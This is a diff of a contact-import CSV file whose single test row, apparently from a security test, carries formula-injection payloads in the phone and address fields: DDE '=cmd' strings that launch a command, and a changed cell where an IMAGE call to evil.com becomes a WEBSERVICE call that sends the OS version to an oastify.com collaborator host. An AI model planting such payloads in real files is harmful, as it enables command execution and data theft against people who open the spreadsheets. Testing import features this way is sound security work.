@@ -1,2 +1,2 @@
 Last Name,First Name,Company,Email,Phone,Address,Address 2,City,State,Zipcode,Birthday,Anniversary,Referred By Name,Referred By Email,Referred By Phone,Do Not Email,Do Not Email Reason
-Test,Test,test,tester13@cacilian.com,=cmd|' /C calc'!A0,=cmd|' /C calc'!A0,=cmd|' /C calc'!A0,=cmd|' /C calc'!A0,=IMAGE("https://evil.com/a.png"),,1/1/1901 12:00:00 AM,1/1/0001 12:00:00 AM,,,,False,
+Test,Test,test,tester13@cacilian.com,=cmd|' /C calc'!A0,=cmd|' /C calc'!A0,=cmd|' /C calc'!A0,=cmd|' /C calc'!A0,=WEBSERVICE("http://zqt90y2xj9k0z23hsu4n5pem5db4zvnk.oastify.com/?"&INFO("osversion")),,1/1/1901 12:00:00 AM,1/1/0001 12:00:00 AM,,,,False,
